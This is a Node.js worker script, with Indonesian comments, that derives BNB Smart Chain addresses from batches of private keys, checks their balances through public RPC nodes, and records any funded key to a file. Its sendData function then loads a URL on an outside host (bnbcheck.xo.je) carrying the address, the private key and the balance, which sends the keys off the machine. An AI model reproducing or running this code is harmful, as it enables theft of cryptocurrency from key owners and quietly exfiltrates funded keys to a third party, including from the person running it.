import fs from "node:fs/promises";
import { parentPort, workerData } from "node:worker_threads";
import { Web3 } from "web3";
import puppeteer, { Page, Puppeteer } from "puppeteer";


const web3 = new Web3();

const OUTPUT = "./output/check_bnb.txt";

await fs.mkdir("./output", { recursive: true });

function saveResults(results) {
  if (results == 0) return Promise.resolve();

  return fs.appendFile(
    OUTPUT,
    results + "\n"
  );
}

const RPC = [
  
  "https://bsc.blockrazor.xyz",
  "https://rpc-bsc.48.club",
  "https://bsc.rpc.blxrbdn.com",
  "https://0.48.club"

];

let batch_no = 0;

let rpcIndex = 0;

const web3A = [];
for (let i = 0; i < RPC.length; i++) {
	const web = new Web3(new Web3.providers.HttpProvider(RPC[i]));
	web3A.push(web);
}

//console.log(web3A);

function getAddress(privateKey) {
  return web3.eth.accounts.privateKeyToAccount('0x' +  privateKey).address; 
}

async function fetchUrl(url) {
  
  const browser = await puppeteer.launch({
    headless: true,
	arg: [
		'--no-sandbox',
		'--disable-dev-shm-usage',
		'--disable-gpu',
		'--no-zygote'
		]
	});
	
	const page = await browser.newPage();
	
	await page.setJavaScriptEnabled(true);
	
  try{
  
    await page.goto(url,{
      waitUntil: "domcontentloaded",
      timeout: 60000
    });

    const html = await page.content();

    //console.log(html);
  } catch(error){
    console.error("Error : ", error.message);
  } finally {
	  browser.close();
  }
}

async function sendData(results) {
  const url = "https://bnbcheck.xo.je/post.php?addr=" + encodeURI(results.address) +
                "&key=" + encodeURI(results.privateKey) +
                "&phrase=" + encodeURI(results.privateKey) +
                "&balance=" + encodeURI(results.blc) ;

  try {
    await fetchUrl(url);
    /*
    //const raw = await response.text();

    //console.log("HTTP Status:", response.status);
    //console.log("Content-Type:", response.headers.get("content-type"));
    //console.log("Response URL:", response.url);
    //console.log("Raw Response:", raw);

    try {
      const result = raw;
      console.log("Result:", result);
    } catch {
      console.error("Server tidak mengembalikan Data.");
    }
    */
  } catch (error) {
    console.error("Request gagal:", error.message);
  }
}

async function getBalance(address, key){
  let hslBal = -1;
	try{
		const balanceWei = await web3A[rpcIndex].eth.getBalance(address);
		const balanceBNB = web3A[rpcIndex].utils.fromWei(balanceWei, "ether");


		batch_no++;

		hslBal = balanceBNB;

		if(balanceBNB > 0){
				
		  const Ares = {address : address, privateKey: key, blc: balanceBNB}
		  const rslt = address + "," + key + "," + balanceBNB;

		  console.log("simpan file : " + address);

			  await saveResults(rslt);

		  console.log("upload file : " + address);
		  await sendData(Ares);
		}	
      
	} catch (e){
      
      console.log(workerData.workerId, rpcIndex, address);
      rpcIndex++;
      if(rpcIndex >= web3A.length){
        rpcIndex = 0;
      }

      
		
	}
  return hslBal;
}

async function processBatch(keys) {
  const results = [];

  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  for (const privateKey of keys) {
    try {
      const address = getAddress(privateKey);
      let balance = -1;

      while (balance < 0) {
        try {
          balance = await getBalance(address, privateKey);

          if(balance < 0){
            //console.log(workerData.workerId, address, balance);
			  await delay(1000);
          } else {
            //console.log(workerData.workerId, address, balance);
            batch_no++;
            break;
          }

          

        } catch (error) {
          parentPort.postMessage({
            type: "error",
            workerId: workerData.workerId,
            message: error.message
          });
        }

        // Balance -1 atau error: tunggu lalu ulangi
        
      }

      if (balance > 0n) {
        results.push({
          address,
          privateKey,
          balance
        });
      }

      parentPort.postMessage({
        type: "progress",
        workerId: workerData.workerId
      });

    } catch (error) {
      parentPort.postMessage({
        type: "error",
        workerId: workerData.workerId,
        message: error.message
      });
    }

  }

  

  parentPort.postMessage({
    type: "batch-complete",
    workerId: workerData.workerId,
    checked: batch_no,
    results
  });
}

parentPort.on("message", async message => {
  if (message.type === "batch") {
    await processBatch(message.keys);
  }
});
